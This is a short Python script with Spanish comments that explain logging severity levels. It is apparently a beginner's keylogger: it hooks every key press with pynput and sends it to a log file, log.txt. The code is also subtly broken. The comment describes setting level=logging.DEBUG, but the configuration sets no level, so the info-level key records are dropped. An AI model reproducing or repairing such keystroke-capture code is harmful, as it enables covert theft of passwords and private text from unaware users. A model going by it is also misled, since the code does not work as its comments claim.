from pynput.keyboard import Key, Listener
import logging

#TIPO DE ERRORES DE DEBUG

# 1 - DEBUG → información detallada para desarrollo
# 2 - INFO → todo va bien, confirmación normal
# 3 - WARNING → algo raro pero no crítico
# 4 - ERROR → algo ha fallado
# 5 - CRITICAL → fallo muy grave

# 1 <----> 5

# El más bajo es nivel menos grave y el más alto es nivel más grave 


# El level es para que pille el error (level=logging.DEBUG) y ignore todo tipo de error y solo acepte (DEBUG) y lo que está por encima del mínimo y acepte la entrada de la tecla.

logging.basicConfig(filename="log.txt")

def presionar(key):
    logging.info(str(key))

with Listener(on_press=presionar) as listener:
    listener.join()
    

    


